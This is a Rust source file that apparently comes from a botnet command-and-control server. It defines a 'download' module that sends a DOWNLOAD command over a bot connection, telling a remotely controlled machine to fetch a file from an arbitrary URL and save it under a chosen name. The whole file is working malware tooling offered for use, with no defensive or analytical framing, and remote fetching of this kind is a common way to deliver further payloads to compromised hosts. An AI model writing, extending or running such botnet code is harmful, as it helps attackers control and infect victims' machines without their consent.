use async_trait::async_trait;
use std::sync::Arc;
use crate::core::state::BotConnection;
use crate::modules::C2Module;
use anyhow::Result;

pub struct DownloadModule;

impl DownloadModule {
    pub fn new() -> Self {
        Self
    }
}

#[async_trait]
impl C2Module for DownloadModule {
    fn name(&self) -> &'static str {
        "download"
    }

    fn description(&self) -> &'static str {
        "Command a bot to download a file from a URL and save it under a specified filename"
    }

    async fn execute(&self, bot: Arc<BotConnection>, args: Vec<String>) -> Result<()> {
        if args.len() != 2 {
            anyhow::bail!("Usage: download <url> <filename>");
        }

        let url = &args[0];
        let filename = &args[1];
        let cmd = format!("DOWNLOAD {} {}\n", url, filename);

        let mut locked_bot = bot.connection.lock().unwrap();
        locked_bot.write_all(cmd.as_bytes()).await?;

        Ok(())
    }
}
